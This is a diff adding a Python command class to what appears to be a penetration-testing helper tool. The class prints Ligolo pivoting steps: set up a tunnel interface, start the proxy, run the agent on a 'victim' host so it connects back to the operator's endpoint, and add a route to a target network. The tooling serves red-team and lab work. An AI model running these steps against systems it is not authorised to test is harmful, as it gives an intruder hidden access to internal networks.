@@ -1,0 +1,52 @@
+import os
+import pwd
+
+from Command import Command
+from Util import getarg
+
+class CommandLigolong(Command):
+    def __init__(self, name: str, config: dict[str, str], tags : list[str]):
+        super().__init__(name, config, tags)
+        configDefaults = config['defaults']
+        self.defaultProxyEndpoint = f'{configDefaults["lhost"]}:{configDefaults["lport"]}'
+ 
+
+    def matchesTrigger(self, trigger : str) -> bool:
+        triggerLower = trigger.lower()
+        ffufTriggers = ['ligolo', 'ligolong']
+        return any(word in triggerLower for word in ffufTriggers)
+
+
+    def getHelp(self) -> str:
+        return 'ligolong [<ligolong-interface>] [<proxy-endpoint>]'
+
+
+    def genCommands(self, trigger: str, args: list[str]) -> list[str]:
+        proxyEnpoint = getarg(args, 1) or self.defaultProxyEndpoint
+        interface = getarg(args, 0) or '<logolong-interface>'
+
+        username = pwd.getpwuid(os.getuid())[0]
+
+        output = []
+        output.append('# prepare ligolo interface')
+        output.append(f'sudo ip tuntap add user {username} mode tun <ligolo-interface>')
+        output.append(f'sudo ip link set {interface} up')
+        output.append('')
+        output.append('# start server')
+        output.append('ligolong-proxy -selfcert')
+        output.append('')
+        output.append('# connect client')
+        output.append('## from Windows victim')
+        output.append(f'.\\ligolong-agent.exe -connect {proxyEnpoint} -ignore-cert')
+        output.append('## from Linux victim (recommended to statically compile agent)')
+        output.append(f'./ligolong-agent-static -connect {proxyEnpoint} -ignore-cert')
+        output.append('')
+        output.append('# list sessions (interactively in ligolo proxy)')
+        output.append('sessions')
+        output.append('')
+        output.append('# select session (interactively) and start tunnel')
+        output.append(f'start --tun {interface}')
+        output.append('')
+        output.append('# set route')
+        output.append(f'sudo ip route add <tartet-net> dev {interface}')
+        return output
